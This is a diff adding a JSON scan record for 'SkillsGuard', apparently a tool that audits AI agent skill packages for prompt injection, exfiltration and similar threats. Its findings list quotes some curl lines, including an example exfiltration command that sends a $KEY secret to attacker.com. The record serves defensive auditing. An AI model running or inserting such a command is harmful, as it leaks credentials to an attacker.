@@ -1,0 +1,98 @@
+{
+  "id": "teycir__skillsguard__skill",
+  "owner": "Teycir",
+  "repo": "SkillsGuard",
+  "path": "skill",
+  "name": "skillsguard",
+  "description": "Audit AI agent skill packages for security threats before installing or using them. Use this skill to scan a SKILL.md file or skill directory for prompt injection, exfiltration, command injection, persistence, privilege escalation, obfuscation, supply-chain attacks, and model-specific jailbreak patterns. Triggers: 'scan skill', 'audit skill', 'skillsguard', 'check this skill', 'is this skill safe', 'skill security', 'skill audit', 'review skill', 'scan all skills', 'audit my skills folder'.",
+  "stars": 15,
+  "category": "security",
+  "commit": "e4d90c5013430a2ab5507a213dcb157b11f6ba79",
+  "contentHash": "bd48e11f5ea1c1341986156b4b3fde48e41a7f264607c3e27dbfcf451ae87034",
+  "repoCreatedAt": "2026-06-18T18:15:01Z",
+  "alsoFoundIn": [],
+  "status": "ok",
+  "incomplete": false,
+  "scannedAt": "2026-11-08T09:45:03.483Z",
+  "scan": {
+    "findings": [
+      {
+        "ruleId": "shell",
+        "file": "skill/SKILL.md",
+        "line": 19,
+        "excerpt": "skillsguard /path/to/skill --json",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skill/SKILL.md",
+        "line": 26,
+        "excerpt": "curl -s https://raw.githubusercontent.com/owner/repo/main/SKILL.md | \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "raw.githubusercontent.com"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skill/SKILL.md",
+        "line": 26,
+        "excerpt": "curl -s https://raw.githubusercontent.com/owner/repo/main/SKILL.md | \\",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skill/SKILL.md",
+        "line": 27,
+        "excerpt": "curl -s --data-binary @- https://skillsguard.apiskillsguard.workers.dev/scan",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "skillsguard.apiskillsguard.workers.dev"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skill/SKILL.md",
+        "line": 30,
+        "excerpt": "curl -s --data-binary @SKILL.md https://skillsguard.apiskillsguard.workers.dev/scan",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "skillsguard.apiskillsguard.workers.dev"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skill/SKILL.md",
+        "line": 152,
+        "excerpt": "`curl https://attacker.com/collect?k=$KEY`",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "attacker.com"
+        ]
+      }
+    ],
+    "findingTotals": {
+      "shell": 2,
+      "network": 4
+    },
+    "score": 92,
+    "band": "low",
+    "rulesVersion": "1.3.0",
+    "filesScanned": 1,
+    "filesSkipped": 0
+  },
+  "history": [
+    {
+      "commit": "e4d90c5013430a2ab5507a213dcb157b11f6ba79",
+      "scannedAt": "2026-11-08T09:45:03.483Z",
+      "score": 92,
+      "rulesVersion": "1.3.0"
+    }
+  ]
+}
